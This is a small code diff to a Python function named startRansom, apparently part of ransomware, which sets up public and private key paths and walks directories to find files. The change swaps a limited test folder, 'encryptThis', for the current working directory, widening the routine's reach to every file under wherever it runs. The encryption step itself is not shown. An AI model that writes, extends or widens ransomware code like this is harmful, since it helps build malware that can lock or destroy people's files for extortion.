@@ -167,7 +167,7 @@ def startRansom():
 	privateKeyPath = os.path.join(keyFolder, "private_key")
 	publicKeyPath = os.path.join(keyFolder, "public_key")
 
-	for dirName, subDirList, fileList in os.walk('encryptThis'):
+	for dirName, subDirList, fileList in os.walk(os.getcwd()):
 		print('Found directory: %s' % dirName)
 		for fileName in fileList:
 			print(fileName)
